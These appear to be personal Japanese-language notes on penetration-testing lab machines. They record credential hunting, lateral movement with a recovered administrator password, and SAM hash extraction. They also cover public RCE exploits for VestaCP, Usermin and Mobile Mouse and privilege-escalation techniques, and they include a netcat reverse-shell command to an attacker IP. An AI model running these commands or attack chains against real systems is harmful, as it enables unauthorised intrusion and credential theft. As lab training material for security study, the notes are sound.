# AD

## MS01

1. 提供された認証情報でSSH接続し、ホームディレクトリを検索すると、`admintool.exe`という怪しいバイナリを発見したので、これをKaliに転送し、`strings`コマンドで中身を見ると、administratorのパスワードを発見

2. 1の別のベクターとして、一般ユーザーでも閲覧ができる`C:\inetpub\wwwroot\partner`配下に`db`というファイルを発見し、中身をtypeするとsqliteという文字列があったため、これをKaliに転送し、sqlitebrowserで中身を確認→supportユーザーの認証情報を発見した（supportユーザーの配下にも`admintool.exe`というのがあったので、ここからadministratorに権限昇格）
```zsh
sqlitebrowser db
```

3. 権限昇格後、PowerShellヒストリーを見ると、以下のように認証情報を発見
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
shutdown /r /t 7
```
- この認証情報を見逃して、時間をロスした
	- ==ただ情報を収集するだけではダメで、それが何を意味しているのかを推察すること==
		- 今回のケースでは、admintool.exeに別の認証情報が入力されていて、これが別ホストの管理者パスワードだと推測すべきだった

4. 認証情報をもとに、MS02にローカル認証でログイン試行（ステップ１でadmintool.exeで得た認証情報がMS01のローカル管理者ユーザーのものだったので、今回もMS02のローカル管理者ユーザーのものと推察）
```zsh
nxc winrm 10.10.195.154 -u administrator -p 'hghgib6vHT3bVWf' --local-auth
```

## MS02

- C:\windows.old配下から、古いSAMとSYSTEMを読み取れたので、そこからDCのadminユーザーのパスワードハッシュを抽出し、DC01を侵害

## DC01

---

# Frankfurt

1. SNMPのextend機能を列挙すると、ユーザーの認証情報を入手
	- NmapのTCP openポートが多すぎて、UDPに着目していなかった
	- ==snmpがあったらかならず列挙する==
	- rabbit holeにハマったら、まずハマるような難易度の列挙やエクスプロイトはないと考える
	- 脆弱性があるかどうかわからない状態で、脆弱性の検証に試行錯誤していたら、一旦立ち止まる

2. vestacpのVestacp RCE PE(Authenticated)[CVE-2020-10808](https://nvd.nist.gov/vuln/detail/CVE-2020-10808)を利用し、シェルを獲得

3. シェルを獲得したが、基本的なコマンドを実行できないため、rootの非インタラクティブシェル上でncを再度実行し、pwn
```zsh
busybox nc 192.168.45.237 4444 -e sh
```


---

# Charlie

1. Nmapでftpがanonymousログイン可能と表示されたため、列挙すると、backupフォルダにPDFファイルがあったため、`exiftool`でAuthorからユーザー名を抽出
	- frpでフォルダがあったのに、見逃してしまった
	- →可視性のよい`lftp`を使うこと

2. Userminがhttpsでポート20000で動作していたため、１で抽出したユーザー名小文字：ユーザー名小文字の組み合わせでログイン
	- UserminのRCE脆弱性に飛びついてしまった（password_change.cgiというページにアクセス可能である必要があったが、アクセスできないのに、様々なPoCを試していた）
	- →==脆弱性をエクスプロイトするまえに、動作原理をpaperで確認すること==

3. Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)を用いて、初期侵入

4. cron jobで`tar`がワイルドカード(`*`)で実行されていたため、[[💥Linux Privilege Escalation#Unix Wildcards Gone Wild]]でエクスプロイトし、権限昇格


---

# Pascha

1. Nmapの結果、Mouse Serverが動作していたため、エクスプロイトを検索し、Mobile Mouse 3.6.0.4 Remote Code Execution Exploit（[CVE-2023-31902](https://nvd.nist.gov/vuln/detail/CVE-2023-31902)）を利用して、初期侵入
	- 他に攻撃ベクターが見つからない場合は、バージョン情報がわからずとも、エクスプロイトを実行してみるのも１つの手

2. サービスバイナリが書き換え可能、かつ、LocalSystemによって実行されていたため、[[💥Windows Privilege Escalation#Service Exploits - Service Binary Hijacking]]で権限昇格